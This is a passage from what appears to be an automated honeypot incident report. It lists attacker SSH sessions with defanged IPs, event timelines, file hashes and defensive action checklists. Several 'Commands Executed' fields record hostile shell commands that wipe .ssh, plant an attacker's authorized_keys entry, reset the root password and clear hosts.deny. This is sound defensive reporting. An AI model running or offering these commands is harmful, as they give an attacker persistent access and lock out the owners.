| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 06:58:01` | `cowrie.session.connect` |
| `2026-06-08 06:58:01` | `cowrie.client.version` |
| `2026-06-08 06:58:01` | `cowrie.client.kex` |
| `2026-06-08 06:58:02` | `cowrie.login.success` |
| `2026-06-08 06:58:02` | `cowrie.session.params` |
| `2026-06-08 06:58:02` | `cowrie.command.input` |
| `2026-06-08 06:58:02` | `cowrie.command.failed` |
| `2026-06-08 06:58:03` | `cowrie.log.closed` |
| `2026-06-08 06:58:03` | `cowrie.session.params` |
| `2026-06-08 06:58:03` | `cowrie.command.input` |
| `2026-06-08 06:58:03` | `cowrie.session.file_download` |
| `2026-06-08 06:58:03` | `cowrie.log.closed` |
| `2026-06-08 06:58:19` | `cowrie.session.params` |
| `2026-06-08 06:58:19` | `cowrie.command.input` |
| `2026-06-08 06:58:20` | `cowrie.log.closed` |
| `2026-06-08 06:58:20` | `cowrie.session.params` |
| `2026-06-08 06:58:20` | `cowrie.command.input` |
| `2026-06-08 06:58:20` | `cowrie.log.closed` |
| `2026-06-08 06:58:20` | `cowrie.session.params` |
| `2026-06-08 06:58:20` | `cowrie.command.input` |
| `2026-06-08 06:58:20` | `cowrie.session.file_download` |
| `2026-06-08 06:58:20` | `cowrie.log.closed` |
| `2026-06-08 06:58:21` | `cowrie.session.params` |
| `2026-06-08 06:58:21` | `cowrie.command.input` |
| `2026-06-08 06:58:21` | `cowrie.log.closed` |
| `2026-06-08 06:58:22` | `cowrie.session.params` |
| `2026-06-08 06:58:22` | `cowrie.command.input` |
| `2026-06-08 06:58:22` | `cowrie.log.closed` |
| `2026-06-08 06:58:22` | `cowrie.session.params` |
| `2026-06-08 06:58:22` | `cowrie.command.input` |
| `2026-06-08 06:58:22` | `cowrie.command.input` |
| `2026-06-08 06:58:23` | `cowrie.log.closed` |
| `2026-06-08 06:58:23` | `cowrie.session.params` |
| `2026-06-08 06:58:23` | `cowrie.command.input` |
| `2026-06-08 06:58:24` | `cowrie.log.closed` |
| `2026-06-08 06:58:24` | `cowrie.session.params` |
| `2026-06-08 06:58:24` | `cowrie.command.input` |
| `2026-06-08 06:58:24` | `cowrie.log.closed` |
| `2026-06-08 06:58:25` | `cowrie.session.params` |
| `2026-06-08 06:58:25` | `cowrie.command.input` |
| `2026-06-08 06:58:25` | `cowrie.log.closed` |
| `2026-06-08 06:58:25` | `cowrie.session.params` |
| `2026-06-08 06:58:25` | `cowrie.command.input` |
| `2026-06-08 06:58:31` | `cowrie.log.closed` |
| `2026-06-08 06:58:31` | `cowrie.session.params` |
| `2026-06-08 06:58:31` | `cowrie.command.input` |
| `2026-06-08 06:58:32` | `cowrie.log.closed` |
| `2026-06-08 06:58:32` | `cowrie.session.params` |
| `2026-06-08 06:58:32` | `cowrie.command.input` |
| `2026-06-08 06:58:32` | `cowrie.log.closed` |
| `2026-06-08 06:58:32` | `cowrie.session.params` |
| `2026-06-08 06:58:32` | `cowrie.command.input` |
| `2026-06-08 06:58:33` | `cowrie.log.closed` |
| `2026-06-08 06:58:33` | `cowrie.session.params` |
| `2026-06-08 06:58:33` | `cowrie.command.input` |
| `2026-06-08 06:58:33` | `cowrie.log.closed` |
| `2026-06-08 06:58:33` | `cowrie.session.params` |
| `2026-06-08 06:58:33` | `cowrie.command.input` |
| `2026-06-08 06:58:34` | `cowrie.log.closed` |
| `2026-06-08 06:58:34` | `cowrie.session.params` |
| `2026-06-08 06:58:34` | `cowrie.command.input` |
| `2026-06-08 06:58:34` | `cowrie.log.closed` |
| `2026-06-08 06:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]14` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7667f43b68be

| Field | Detail |
|---|---|
| **Source IP** | `115.190.46[.]94` |
| **First Seen** | 2026-06-08 07:08 |
| **Last Seen** | 2026-06-08 07:08 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:gBPkxlsTVi85"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 07:08:19` | `cowrie.session.connect` |
| `2026-06-08 07:08:19` | `cowrie.client.version` |
| `2026-06-08 07:08:19` | `cowrie.client.kex` |
| `2026-06-08 07:08:20` | `cowrie.login.success` |
| `2026-06-08 07:08:21` | `cowrie.session.params` |
| `2026-06-08 07:08:21` | `cowrie.command.input` |
| `2026-06-08 07:08:21` | `cowrie.command.failed` |
| `2026-06-08 07:08:21` | `cowrie.log.closed` |
| `2026-06-08 07:08:21` | `cowrie.session.params` |
| `2026-06-08 07:08:21` | `cowrie.command.input` |
| `2026-06-08 07:08:21` | `cowrie.session.file_download` |
| `2026-06-08 07:08:21` | `cowrie.log.closed` |
| `2026-06-08 07:08:37` | `cowrie.session.params` |
| `2026-06-08 07:08:37` | `cowrie.command.input` |
| `2026-06-08 07:08:38` | `cowrie.log.closed` |
| `2026-06-08 07:08:38` | `cowrie.session.params` |
| `2026-06-08 07:08:38` | `cowrie.command.input` |
| `2026-06-08 07:08:38` | `cowrie.log.closed` |
| `2026-06-08 07:08:39` | `cowrie.session.params` |
| `2026-06-08 07:08:39` | `cowrie.command.input` |
| `2026-06-08 07:08:39` | `cowrie.session.file_download` |
| `2026-06-08 07:08:39` | `cowrie.log.closed` |
| `2026-06-08 07:08:39` | `cowrie.session.params` |
| `2026-06-08 07:08:39` | `cowrie.command.input` |
| `2026-06-08 07:08:40` | `cowrie.log.closed` |
| `2026-06-08 07:08:40` | `cowrie.session.params` |
| `2026-06-08 07:08:40` | `cowrie.command.input` |
| `2026-06-08 07:08:40` | `cowrie.log.closed` |
| `2026-06-08 07:08:41` | `cowrie.session.params` |
| `2026-06-08 07:08:41` | `cowrie.command.input` |
| `2026-06-08 07:08:41` | `cowrie.command.input` |
| `2026-06-08 07:08:41` | `cowrie.log.closed` |
| `2026-06-08 07:08:41` | `cowrie.session.params` |
| `2026-06-08 07:08:41` | `cowrie.command.input` |
| `2026-06-08 07:08:41` | `cowrie.log.closed` |
| `2026-06-08 07:08:42` | `cowrie.session.params` |
| `2026-06-08 07:08:42` | `cowrie.command.input` |
| `2026-06-08 07:08:42` | `cowrie.log.closed` |
| `2026-06-08 07:08:42` | `cowrie.session.params` |
| `2026-06-08 07:08:42` | `cowrie.command.input` |
| `2026-06-08 07:08:42` | `cowrie.log.closed` |
| `2026-06-08 07:08:43` | `cowrie.session.params` |
| `2026-06-08 07:08:43` | `cowrie.command.input` |
| `2026-06-08 07:08:43` | `cowrie.log.closed` |
| `2026-06-08 07:08:43` | `cowrie.session.params` |
| `2026-06-08 07:08:43` | `cowrie.command.input` |
| `2026-06-08 07:08:44` | `cowrie.log.closed` |
| `2026-06-08 07:08:44` | `cowrie.session.params` |
| `2026-06-08 07:08:44` | `cowrie.command.input` |
| `2026-06-08 07:08:44` | `cowrie.log.closed` |
| `2026-06-08 07:08:44` | `cowrie.session.params` |
| `2026-06-08 07:08:44` | `cowrie.command.input` |
| `2026-06-08 07:08:45` | `cowrie.log.closed` |
| `2026-06-08 07:08:45` | `cowrie.session.params` |
| `2026-06-08 07:08:45` | `cowrie.command.input` |
| `2026-06-08 07:08:45` | `cowrie.log.closed` |
| `2026-06-08 07:08:45` | `cowrie.session.params` |
| `2026-06-08 07:08:45` | `cowrie.command.input` |
| `2026-06-08 07:08:46` | `cowrie.log.closed` |
| `2026-06-08 07:08:46` | `cowrie.session.params` |
| `2026-06-08 07:08:46` | `cowrie.command.input` |
| `2026-06-08 07:08:46` | `cowrie.log.closed` |
| `2026-06-08 07:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.190.46[.]94` to AbuseIPDB if not already reported
- [ ] Block `115.190.46[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6471a776582d

| Field | Detail |
|---|---|
| **Source IP** | `154.81.14[.]172` |
| **First Seen** | 2026-06-08 07:27 |
| **Last Seen** | 2026-06-08 07:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 07:27:39` | `cowrie.session.connect` |
| `2026-06-08 07:27:39` | `cowrie.client.version` |
| `2026-06-08 07:27:39` | `cowrie.client.kex` |
| `2026-06-08 07:27:40` | `cowrie.login.success` |
| `2026-06-08 07:27:40` | `cowrie.session.params` |
| `2026-06-08 07:27:40` | `cowrie.command.input` |
| `2026-06-08 07:27:40` | `cowrie.command.failed` |
| `2026-06-08 07:27:40` | `cowrie.log.closed` |
| `2026-06-08 07:27:40` | `cowrie.session.params` |
| `2026-06-08 07:27:40` | `cowrie.command.input` |
| `2026-06-08 07:27:40` | `cowrie.session.file_download` |
| `2026-06-08 07:27:40` | `cowrie.log.closed` |
| `2026-06-08 07:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.14[.]172` to AbuseIPDB if not already reported
- [ ] Block `154.81.14[.]172` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8da13ca9b01

| Field | Detail |
|---|---|
| **Source IP** | `154.81.14[.]172` |
| **First Seen** | 2026-06-08 07:27 |
| **Last Seen** | 2026-06-08 07:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 07:27:42` | `cowrie.session.connect` |
| `2026-06-08 07:27:42` | `cowrie.client.version` |
| `2026-06-08 07:27:42` | `cowrie.client.kex` |
| `2026-06-08 07:27:42` | `cowrie.login.success` |
| `2026-06-08 07:27:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.81.14[.]172` to AbuseIPDB if not already reported
- [ ] Block `154.81.14[.]172` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb96e4f3b03e

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]14` |
| **First Seen** | 2026-06-08 07:28 |
| **Last Seen** | 2026-06-08 07:28 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:oEgMUeOeJsj3"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 07:28:09` | `cowrie.session.connect` |
| `2026-06-08 07:28:09` | `cowrie.client.version` |
| `2026-06-08 07:28:10` | `cowrie.client.kex` |
| `2026-06-08 07:28:10` | `cowrie.login.success` |
| `2026-06-08 07:28:10` | `cowrie.session.params` |
| `2026-06-08 07:28:10` | `cowrie.command.input` |
| `2026-06-08 07:28:10` | `cowrie.command.failed` |
| `2026-06-08 07:28:10` | `cowrie.log.closed` |
| `2026-06-08 07:28:11` | `cowrie.session.params` |
| `2026-06-08 07:28:11` | `cowrie.command.input` |
| `2026-06-08 07:28:11` | `cowrie.session.file_download` |
| `2026-06-08 07:28:11` | `cowrie.log.closed` |
| `2026-06-08 07:28:22` | `cowrie.session.params` |
| `2026-06-08 07:28:22` | `cowrie.command.input` |
| `2026-06-08 07:28:22` | `cowrie.log.closed` |
| `2026-06-08 07:28:22` | `cowrie.session.params` |
| `2026-06-08 07:28:22` | `cowrie.command.input` |
| `2026-06-08 07:28:22` | `cowrie.log.closed` |
| `2026-06-08 07:28:23` | `cowrie.session.params` |
| `2026-06-08 07:28:23` | `cowrie.command.input` |
| `2026-06-08 07:28:23` | `cowrie.session.file_download` |
| `2026-06-08 07:28:23` | `cowrie.log.closed` |
| `2026-06-08 07:28:23` | `cowrie.session.params` |
| `2026-06-08 07:28:23` | `cowrie.command.input` |
| `2026-06-08 07:28:24` | `cowrie.log.closed` |
| `2026-06-08 07:28:24` | `cowrie.session.params` |
| `2026-06-08 07:28:24` | `cowrie.command.input` |
| `2026-06-08 07:28:25` | `cowrie.log.closed` |
| `2026-06-08 07:28:25` | `cowrie.session.params` |
| `2026-06-08 07:28:25` | `cowrie.command.input` |
| `2026-06-08 07:28:25` | `cowrie.command.input` |
| `2026-06-08 07:28:26` | `cowrie.log.closed` |
| `2026-06-08 07:28:26` | `cowrie.session.params` |
| `2026-06-08 07:28:26` | `cowrie.command.input` |
| `2026-06-08 07:28:26` | `cowrie.log.closed` |
| `2026-06-08 07:28:26` | `cowrie.session.params` |
| `2026-06-08 07:28:26` | `cowrie.command.input` |
| `2026-06-08 07:28:27` | `cowrie.log.closed` |
| `2026-06-08 07:28:27` | `cowrie.session.params` |
| `2026-06-08 07:28:27` | `cowrie.command.input` |
| `2026-06-08 07:28:28` | `cowrie.log.closed` |
| `2026-06-08 07:28:28` | `cowrie.session.params` |
| `2026-06-08 07:28:28` | `cowrie.command.input` |
| `2026-06-08 07:28:28` | `cowrie.log.closed` |
| `2026-06-08 07:28:28` | `cowrie.session.params` |
| `2026-06-08 07:28:28` | `cowrie.command.input` |
| `2026-06-08 07:28:29` | `cowrie.log.closed` |
| `2026-06-08 07:28:29` | `cowrie.session.params` |
| `2026-06-08 07:28:29` | `cowrie.command.input` |
| `2026-06-08 07:28:29` | `cowrie.log.closed` |
| `2026-06-08 07:28:29` | `cowrie.session.params` |
| `2026-06-08 07:28:29` | `cowrie.command.input` |
| `2026-06-08 07:28:30` | `cowrie.log.closed` |
| `2026-06-08 07:28:30` | `cowrie.session.params` |
| `2026-06-08 07:28:30` | `cowrie.command.input` |
| `2026-06-08 07:28:31` | `cowrie.log.closed` |
| `2026-06-08 07:28:31` | `cowrie.session.params` |
| `2026-06-08 07:28:31` | `cowrie.command.input` |
| `2026-06-08 07:28:31` | `cowrie.log.closed` |
| `2026-06-08 07:28:32` | `cowrie.session.params` |
| `2026-06-08 07:28:32` | `cowrie.command.input` |
| `2026-06-08 07:28:32` | `cowrie.log.closed` |
| `2026-06-08 07:28:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]14` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2162f547cb85

| Field | Detail |
|---|---|
| **Source IP** | `118.145.230[.]7` |
| **First Seen** | 2026-06-08 08:00 |
| **Last Seen** | 2026-06-08 08:02 |
| **Session Duration** | 151s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:00:25` | `cowrie.session.connect` |
| `2026-06-08 08:00:26` | `cowrie.client.version` |
| `2026-06-08 08:00:27` | `cowrie.client.kex` |
| `2026-06-08 08:00:34` | `cowrie.login.success` |
| `2026-06-08 08:00:38` | `cowrie.session.params` |
| `2026-06-08 08:00:38` | `cowrie.command.input` |
| `2026-06-08 08:00:38` | `cowrie.command.failed` |
| `2026-06-08 08:00:49` | `cowrie.log.closed` |
| `2026-06-08 08:00:59` | `cowrie.session.params` |
| `2026-06-08 08:00:59` | `cowrie.command.input` |
| `2026-06-08 08:01:03` | `cowrie.session.file_download` |
| `2026-06-08 08:01:03` | `cowrie.log.closed` |
| `2026-06-08 08:02:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.230[.]7` to AbuseIPDB if not already reported
- [ ] Block `118.145.230[.]7` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fcf4aebb5dfa

| Field | Detail |
|---|---|
| **Source IP** | `118.145.230[.]7` |
| **First Seen** | 2026-06-08 08:01 |
| **Last Seen** | 2026-06-08 08:02 |
| **Session Duration** | 46s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:01:50` | `cowrie.session.connect` |
| `2026-06-08 08:01:58` | `cowrie.client.version` |
| `2026-06-08 08:02:03` | `cowrie.client.kex` |
| `2026-06-08 08:02:33` | `cowrie.login.success` |
| `2026-06-08 08:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.230[.]7` to AbuseIPDB if not already reported
- [ ] Block `118.145.230[.]7` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5a79842d356

| Field | Detail |
|---|---|
| **Source IP** | `203.23.199[.]88` |
| **First Seen** | 2026-06-08 08:10 |
| **Last Seen** | 2026-06-08 08:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:10:56` | `cowrie.session.connect` |
| `2026-06-08 08:10:56` | `cowrie.client.version` |
| `2026-06-08 08:10:56` | `cowrie.client.kex` |
| `2026-06-08 08:10:57` | `cowrie.login.success` |
| `2026-06-08 08:10:57` | `cowrie.session.params` |
| `2026-06-08 08:10:57` | `cowrie.command.input` |
| `2026-06-08 08:10:57` | `cowrie.command.failed` |
| `2026-06-08 08:10:58` | `cowrie.log.closed` |
| `2026-06-08 08:10:58` | `cowrie.session.params` |
| `2026-06-08 08:10:58` | `cowrie.command.input` |
| `2026-06-08 08:10:58` | `cowrie.session.file_download` |
| `2026-06-08 08:10:58` | `cowrie.log.closed` |
| `2026-06-08 08:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.23.199[.]88` to AbuseIPDB if not already reported
- [ ] Block `203.23.199[.]88` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb9c28bf7f96

| Field | Detail |
|---|---|
| **Source IP** | `203.23.199[.]88` |
| **First Seen** | 2026-06-08 08:11 |
| **Last Seen** | 2026-06-08 08:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:11:00` | `cowrie.session.connect` |
| `2026-06-08 08:11:00` | `cowrie.client.version` |
| `2026-06-08 08:11:00` | `cowrie.client.kex` |
| `2026-06-08 08:11:01` | `cowrie.login.success` |
| `2026-06-08 08:11:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.23.199[.]88` to AbuseIPDB if not already reported
- [ ] Block `203.23.199[.]88` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afc0a037e7f0

| Field | Detail |
|---|---|
| **Source IP** | `95.71.127[.]158` |
| **First Seen** | 2026-06-08 08:21 |
| **Last Seen** | 2026-06-08 08:24 |
| **Session Duration** | 137s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:T8qZCT6UVDUX"|chpasswd|bash, cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-08 08:21:52` | `cowrie.session.connect` |
| `2026-06-08 08:21:54` | `cowrie.client.version` |
| `2026-06-08 08:21:54` | `cowrie.client.kex` |
| `2026-06-08 08:21:57` | `cowrie.login.success` |
| `2026-06-08 08:21:58` | `cowrie.session.params` |
| `2026-06-08 08:21:58` | `cowrie.command.input` |
| `2026-06-08 08:21:58` | `cowrie.command.failed` |
| `2026-06-08 08:22:00` | `cowrie.log.closed` |
| `2026-06-08 08:22:02` | `cowrie.session.params` |
| `2026-06-08 08:22:02` | `cowrie.command.input` |
| `2026-06-08 08:22:02` | `cowrie.session.file_download` |
| `2026-06-08 08:22:02` | `cowrie.log.closed` |
| `2026-06-08 08:22:20` | `cowrie.session.params` |
| `2026-06-08 08:22:20` | `cowrie.command.input` |
| `2026-06-08 08:22:21` | `cowrie.log.closed` |
| `2026-06-08 08:22:21` | `cowrie.session.params` |
| `2026-06-08 08:22:21` | `cowrie.command.input` |
| `2026-06-08 08:22:36` | `cowrie.log.closed` |
| `2026-06-08 08:22:37` | `cowrie.session.params` |
| `2026-06-08 08:22:37` | `cowrie.command.input` |
| `2026-06-08 08:22:38` | `cowrie.log.closed` |
| `2026-06-08 08:22:39` | `cowrie.session.params` |
| `2026-06-08 08:22:39` | `cowrie.command.input` |
| `2026-06-08 08:22:40` | `cowrie.log.closed` |
| `2026-06-08 08:24:09` | `cowrie.session.params` |
| `2026-06-08 08:24:09` | `cowrie.command.input` |
| `2026-06-08 08:24:09` | `cowrie.command.input` |
